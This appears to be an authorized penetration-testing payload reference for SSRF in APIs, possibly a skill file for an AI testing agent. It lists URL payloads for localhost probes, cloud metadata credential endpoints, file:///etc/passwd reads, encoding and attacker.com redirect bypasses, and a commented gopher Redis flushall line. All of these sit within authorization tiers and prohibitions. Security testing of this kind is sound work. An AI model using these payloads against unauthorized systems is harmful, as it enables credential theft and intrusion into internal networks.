# API SSRF Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify API SSRF vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual internal network attacks are prohibited
> - SSRF payloads are for understanding attack surface only, **no internal network service exploitation**
> - Validation proves vulnerability existence (probe localhost or external marker), **no malicious data write**
> - Cloud metadata and internal probing require explicit user authorization
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: APIs are commonly used in microservice architecture, SSRF is an important pathway to attack internal APIs and cloud infrastructure**

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | Localhost probe, external marker, protocol test | No authorization needed |
| **Tier 2: Authorized Extended** | Cloud metadata read, internal service probe | User explicit authorization required |
| **Tier 3: Theory Reference** | SSRF exploitation, service attack | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods.
**Stop condition**: After confirming SSRF exists (localhost or marker response received).

---

## Validation Objectives (Within Security Boundary)

API SSRF vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| SSRF Existence | Request `http://127.0.0.1` or external marker domain | - | Internal network attack exploitation |
| Cloud Metadata Read | ❌ Not by default | ✓ Requires user explicit authorization | Credential exploitation after retrieval |
| Internal Service Probe | ❌ Not by default | ✓ Requires user explicit authorization | Service exploitation/RCE |
| Protocol Test | Test if `file://` supported | - | Redis write/Webshell |

**Current Stance**: 
- Default only validate SSRF existence (request localhost or external marker server)
- Cloud metadata, internal service probing require user explicit authorization before execution
- No SSRF exploitation for any attack operations

---

## Default Validation Payload

### SSRF Existence Validation (Recommended)

```json
// Request localhost to prove SSRF capability
{"url": "http://127.0.0.1:80"}
{"endpoint": "http://localhost:8080/api/health"}

// Request external marker server to confirm outbound request
{"url": "http://YOUR_COLLABORATOR/ssrf-test"}
{"callback_url": "http://YOUR_COLLABORATOR/callback"}
```

---

## ⚠️ Cloud Metadata and Internal Network Probing (Requires Additional Authorization)

Following operations require user explicit authorization before execution:

### Cloud Metadata Endpoints

```bash
# AWS metadata endpoint (requires authorization)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata endpoint (requires authorization + Header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/

# Azure metadata endpoint (requires authorization + Header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Authorization Requirements**:
1. User explicitly authorizes cloud metadata reading
2. Only for proving SSRF capability, no credential exploitation after retrieval
3. Mark "Cloud metadata read with user authorization" in report

### Internal Service Probing (Requires Authorization)

**⚠️ IMPORTANT**: Internal service probing is NOT a default validation step. These examples are for **theory reference only** and require explicit user authorization before execution.

**Authorization Requirements** (must be fulfilled before attempting):
1. User explicitly authorizes internal network probing in writing
2. Only identify open ports/services, no exploitation
3. Mark "Internal network probing executed with user authorization" in report

**Theoretical Examples** (do not execute without authorization):
```bash
# The following are for understanding attack surface only
# DO NOT execute unless user has explicitly authorized internal probing

# ⚠️ Requires explicit authorization:
# http://127.0.0.1:22    # SSH - requires auth
# http://127.0.0.1:3306  # MySQL - requires auth
# http://127.0.0.1:6379  # Redis - requires auth

# Localhost HTTP (80/8080/3000) may be default-allowed if in scope
http://127.0.0.1:80     # HTTP - can test if response differs
http://127.0.0.1:8080   # HTTP proxy - can test if accessible
```

## Common SSRF Entry Points in APIs

**Note**: Following examples show where SSRF may occur. Default validation uses localhost or external marker. Cloud metadata and internal URLs require authorization.

```json
# URL import/fetch function - default validation
{"url": "http://127.0.0.1:80"}
{"url": "http://YOUR_COLLABORATOR/ssrf-test"}

# ⚠️ Cloud metadata targets - require authorization
# {"avatar_url": "http://169.254.169.254/latest/meta-data/"}  # requires auth

# ⚠️ Internal service targets - require authorization
# {"callback_url": "http://127.0.0.1:8080/admin"}  # requires auth

# Webhook/callback URL configuration
{"callback_url": "http://YOUR_COLLABORATOR/callback"}
{"webhook_endpoint": "http://127.0.0.1:8080"}  # localhost is default-ok

# Image/file preview and processing
{"image_url": "http://127.0.0.1:8080"}
{"document_url": "file:///etc/hostname"}  # protocol test

# PDF/report generation
{"html_url": "file:///etc/hostname"}
{"template_url": "http://localhost:3000"}

# Other scenarios
- OpenID/OAuth redirect_uri
- Import/Export functions
- API gateway routing parameters
```

## SSRF in JSON Body
```json
# Default validation: request localhost
{"url": "http://127.0.0.1:80"}
{"endpoint": "http://localhost:8080/api/health"}

# Default validation: request external marker server
{"url": "http://YOUR_COLLABORATOR/ssrf-test"}

# Protocol test (prove file:// support, no sensitive file read)
{"file_path": "file:///etc/hostname"}
```

## SSRF in REST Parameters
```http
# GET Query parameters
GET /api/fetch?url=http://127.0.0.1:8080
GET /api/webhook/test?endpoint=http://YOUR_COLLABORATOR/test

# Path parameters
GET /api/download/http%3A%2F%2F127.0.0.1%3A80
```

## ⚠️ SSRF to RCE (For Theory Analysis Only, Execution Prohibited)

Following content is for understanding risk severity only, **actual execution prohibited**:

```bash
# SSRF access to internal Redis/Memcached - execution prohibited
# dict://127.0.0.1:6379/INFO
# gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...

# Write to Crontab/Webshell - strictly prohibited
# Exploit unauthorized internal API endpoints - for risk explanation only
```

**Explanation**: SSRF can lead to RCE reflects risk severity, but validation only proves SSRF existence, no exploitation.

## Bypass Techniques (API-Specific)
```bash
# URL encoding bypass (URL in JSON may be decoded twice)
{"url": "http://127.0.0.1/%61dmin"}
{"url": "http://%31%32%37%2e%30%2e%30%2e%31"}

# Parameter pollution (HPP)
GET /api/fetch?url=http://attacker.com&url=http://127.0.0.1

# Redirect bypass (API follows redirects)
{"url": "http://attacker.com/redirect-to-localhost"}

# Protocol bypass (API restricted to http/https)
{"url": "file:///etc/passwd"}
{"url": "netdoc:///etc/hosts"}
```

## Analysis Process (API Scenario)

1. Identify API parameters accepting URL, hostname, IP address, or file path
2. Try requesting external marker server (Collaborator), confirm if API initiates network request
3. Try requesting `http://127.0.0.1`, observe API response (content, status code, response time)
4. Test different protocol support (is `file://` available)
5. **Stop validation**, confirm SSRF vulnerability existence
6. If cloud metadata or internal probing needed, must obtain user additional authorization first
7. Apply bypass techniques (encoding, redirect) only when default validation fails

## Output

- Proof payload (JSON/HTTP request format)
- Complete request packet and response packet
- Successful localhost access response
- Request record received by external marker server
- If using cloud metadata/internal probing: mark "with user authorization"

## Severity Classification

API SSRF severity is based on "what the SSRF can reach" (same model as ssrf.md) — proof-only SSRF evidence remains Low; reaching internal network/cloud credentials is required for High.

| Actual case | Severity | Note |
|---------|------|------|
| Proof only SSRF exists (external marker callback/localhost probe has a response) | Low | capability confirmed, no sensitive data |
| after user authorization reaches internal networkservices (port/response confirms internal reachability) | High | exposes internal attack surface |
| after user authorization reads cloud metadata credentials | High | could enable lateral takeover |
| SSRF exists but is restricted (protocol allowlist / cannot reach internal network) | Low | Capability limited |
| Suspected only (abnormal response without stable callback) | Low | Pending confirmation |

**Key judgment**: Default Tier 1 scope SSRF records Low; "reaches internal network/cloud credentials = High" requires explicit user authorization and confirmation in Tier 2. Do not use read cloud credentials for lateral movement; record and stop.

---

## Prohibited

- ⚠️ No internal network attack or vulnerability exploitation (e.g., SSRF to Redis for shell)
- ⚠️ No reading sensitive system files (e.g., `/etc/shadow`), only read test files to prove vulnerability
- ⚠️ No lateral movement or cloud resource access using cloud credentials
- ⚠️ No cloud metadata reading or internal service probing without authorization